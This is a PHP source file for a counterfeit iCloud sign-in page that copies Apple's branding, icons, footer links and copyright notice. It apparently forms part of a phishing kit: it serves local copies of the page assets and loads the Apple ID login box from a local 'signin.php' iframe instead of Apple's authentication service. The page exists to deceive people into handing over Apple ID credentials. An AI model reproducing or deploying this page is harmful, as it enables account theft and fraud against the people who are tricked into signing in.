<?php
	session_name("CAKEPHP");
	session_start();
	include(__DIR__ . "/../includes/apple.php");
?>

<!DOCTYPE html>
<html lang="en-us" dir="ltr" data-supports-webp="" class="js-focus-visible" data-js-focus-visible="" data-primary-interaction-mode="mouse" data-device-type-class="desktop">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <meta name="description" content="Log in to iCloud to access your photos, mail, notes, documents and more. Sign in with your Apple ID or create a new account to start using Apple services.">
    <meta name="keywords" content="icloud, free, apple">
    <meta name="og:title" content="iCloud.com">
    <meta name="og:image" content="https://www.icloud.com/icloud_logo/icloud_logo.png">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta name="google" content="notranslate">
    <meta name="theme-color" content="rgb(251, 251, 253)" data-default-color="rgb(251, 251, 253)">
    <link rel="apple-touch-icon" sizes="180x180" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="120x120" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="152x152" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon-120x120-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/apple-touch-icon-152x152-precomposed.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/favicon-16x16.png">
    <link rel="mask-icon" sizes="any" color="#898989" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/safari-pinned-tab.svg">

    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>iCloud</title>
    <base href=".">
    <style id="cw-bootstrap-css">
      html {
        background-color: rgb(251, 251, 253);
      }

      #apple-logo,
      #gcbd-logo {
        margin-left: -2px;
        /* stylelint-disable-line */
      }

      html[dir="rtl"] #apple-logo,
      html[dir="rtl"] #gcbd-logo {
        margin-left: 0;
        /* stylelint-disable-line */
        margin-right: -2px;
        /* stylelint-disable-line */
      }

      #early-child.unclaimed {
        visibility: hidden;
      }

      #early-child {
        border: 0;
      }
    </style>
    <link rel="icon" href="https://www.icloud.com/favicon.ico">
    <style id="inert-style">
      [inert] {
        pointer-events: none;
        cursor: default;
      }

      [inert],
      [inert] * {
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }
    </style>
	
    <link rel="stylesheet" type="text/css" href="script/icloud2024/css/2.main.css">
    <link rel="stylesheet" type="text/css" href="script/icloud2024/css/0.main.css">
	
	<script charset="utf-8" src="script/icloud2024/js/2.main.js"></script>
    <script charset="utf-8" src="script/icloud2024/js/0.main.js"></script>
	
    <link rel="preload" as="image" href="https://www.icloud.com/system/icloud.com/2404Project58/wallpaper.webp" type="image/webp">
    <style type="text/css"></style>
  </head>
  <body class="clicking">
    <div id="root">
      <ui-main-pane>
        <span class="screenreader-only-content" role="presentation">
          <div aria-live="polite" aria-relevant="additions" role="log"></div>
        </span>
        <div class="root-viewport">
          <div class="notification-presenter"></div>
          <div class="root-component">
            <div class="flex-page-viewport home-login-route fade-in">
              <div class="flex-page-content">
                <header class="cloudos-toolbar login overlay">
                  <div class="icloud-logo">
                    <a href="https://www.icloud.com/" aria-label="Navigate to icloud.com home page">
                      <img src ="script/icloud2024/img/header_logo.svg"/>
                    </a>
                  </div>
                  <div class="action-buttons">
                    <ui-button class="push primary help-menu-button icloud-mouse" tabindex="0" ontouchstart="void(0)" role="button" aria-label="Help" aria-haspopup="menu">
                      <button type="button" tabindex="-1"></button>
                      <img src ="script/icloud2024/img/dot3.svg"/>
                    </ui-button>
                  </div>
                </header>
                <div class="home-login-component">
                  <div class="parent-container is-visible">
                    <div style="visibility: visible; height: auto;">
                      <div class="widget-icon-text">
                        <img class="icon" draggable="false" alt="" aria-hidden="true" src="script/icloud2024/img/logo.svg">
                        <div class="sign-in-label">
							<?=$language['signin_label'][$lang];?>
						</div>
                      </div>
                      <div id="idms-auth-8e6ae69b-6830-44f7-b658-0cfb25fae676" class="apple-id-container apple-id-frame-value">
                        <iframe src="signin.php" width="100%" height="100%" id="aid-auth-widget-iFrame" name="aid-auth-widget" scrolling="no" frameborder="0" role="none" allow="publickey-credentials-get https://idmsa.apple.com" title="Sign In with your Apple ID"></iframe>
                      </div>
                      <div class="create">
                        <a target="_blank" rel="noreferrer" href="https://www.icloud.com/system/icloud.com/2404Project58/en-us/" class="unstyled-link" aria-label="Create">
							<?=$language['create_id'][$lang];?>
						</a>
                      </div>
                    </div>
                  </div>
                </div>
                <footer>
                  <div class="legal-footer">
                    <div class="application-content">
                      <div class="legal-footer-content">
                        <div class="inner-row" role="presentation">
                          <div class="with-separator">
                            <a class="systemStatus" target="_blank" rel="noreferrer" href="https://www.apple.com/support/systemstatus/" aria-label="System Status (opens in a new tab)">
								<?=$language['system_status'][$lang];?>
							</a>
                            <div aria-hidden="true" class="separator"></div>
                          </div>
                          <div class="with-separator">
                            <a class="privacy" target="_blank" rel="noreferrer" href="https://www.apple.com/legal/privacy/" aria-label="Privacy Policy (opens in a new tab)"><?=$language['privacy'][$lang];?></a>
                            <div aria-hidden="true" class="separator"></div>
                          </div>
                          <a class="terms" target="_blank" rel="noreferrer" href="https://www.apple.com/legal/internet-services/icloud/" aria-label="Terms &amp; Conditions (opens in a new tab)">
							<?=$language['terms'][$lang];?>
						  </a>
                        </div>
                        <div class="inner-row" role="presentation">
                          <span class="copyright">
							Copyright © <?=date('Y');?> Apple Inc. <?=$language['rights'][$lang];?>
						  </span>
                        </div>
                      </div>
                    </div>
                  </div>
                </footer>
              </div>
            </div>
          </div>
        </div>
      </ui-main-pane>
    </div>
    <link rel="stylesheet" href="script/icloud2024/css/main.css">
  </body>
</html>